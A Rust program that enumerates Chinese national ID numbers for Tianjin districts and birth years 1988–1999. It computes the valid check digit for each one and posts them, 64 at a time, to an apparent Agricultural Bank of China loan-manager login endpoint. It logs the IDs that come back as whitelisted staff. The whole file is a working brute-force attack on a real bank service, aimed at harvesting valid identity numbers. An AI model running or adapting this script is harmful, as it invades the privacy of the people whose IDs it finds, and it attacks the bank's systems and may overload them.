use std::{sync::Arc, time::Duration};

use anyhow::Result;
use reqwest::{Client, redirect};
use serde::Deserialize;
use tokio::sync::Semaphore;

const REGIONS: [&str; 16] = [
    "120101", "120102", "120103", "120104", "120105", "120106", "120110", "120111", "120112",
    "120113", "120114", "120115", "120116", "120117", "120118", "120119",
];

const DAYS_IN_MONTH: [u8; 13] = [0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

const WEIGHT: [u32; 18] = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2, 1];

const CHECK_CODES: &str = "10X98765432";

fn cal_check_code(id: &str) -> char {
    let mut sum = 0;
    for (i, c) in id[..17].chars().enumerate() {
        if let Some(digit) = c.to_digit(10) {
            sum += digit * WEIGHT[i];
        }
    }
    CHECK_CODES.chars().nth((sum % 11) as usize).unwrap()
}

struct HttpClient {
    client: Client,
}

#[derive(Deserialize)]
struct QueryResponse {
    code: String,
    msg: String,
}

impl HttpClient {
    fn build() -> Result<Self> {
        let client = reqwest::Client::builder()
            .redirect(redirect::Policy::none())
            .connect_timeout(Duration::from_secs(5))
            .timeout(Duration::from_secs(10))
            .build()?;

        Ok(Self { client })
    }

    async fn query(&self, id_card: &str) -> Result<bool> {
        let response: QueryResponse = self
            .client
            .post("https://app.tj.abchina.com.cn/tj/cmfrloan/cmfrapiLoan/managerLogin")
            .json(&sonic_rs::json!({
                "managerIdNum":id_card
            }))
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        if response.code == "0000" && response.msg == "请求成功" {
            Ok(true)
        } else if response.code == "IL_E106"
            && response.msg == "查询客户经理信息失败，客户经理不在白名单内"
        {
            Ok(false)
        } else {
            anyhow::bail!("{} {}", response.code, response.msg);
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let _guard = login::init_log(&clap_verbosity_flag::Verbosity::new(4, 0), "log", "login2")?;
    let client = Arc::new(HttpClient::build()?);

    let semaphore = Arc::new(Semaphore::new(64));

    for region in REGIONS {
        for y in 1988..2000 {
            for m in 1..13 {
                for d in 1..DAYS_IN_MONTH[m] + 1 {
                    for seq in 1..500 {
                        let mut id_card = format!("{region}{y:04}{m:02}{d:02}{seq:03}");
                        id_card.push(cal_check_code(&id_card));

                        let client = Arc::clone(&client);
                        let permit = semaphore.clone().acquire_owned().await.unwrap();
                        tokio::spawn(async move {
                            match client.query(&id_card).await {
                                Ok(result) => {
                                    if result {
                                        tracing::info!("{id_card} 请求成功");
                                    } else {
                                        //tracing::trace!("{id_card} 不在白名单内");
                                    }
                                }
                                Err(error) => {
                                    tracing::error!("请求异常：{error}")
                                }
                            }

                            drop(permit);
                            anyhow::Ok(())
                        });
                    }
                }
            }
        }
    }

    Ok(())
}
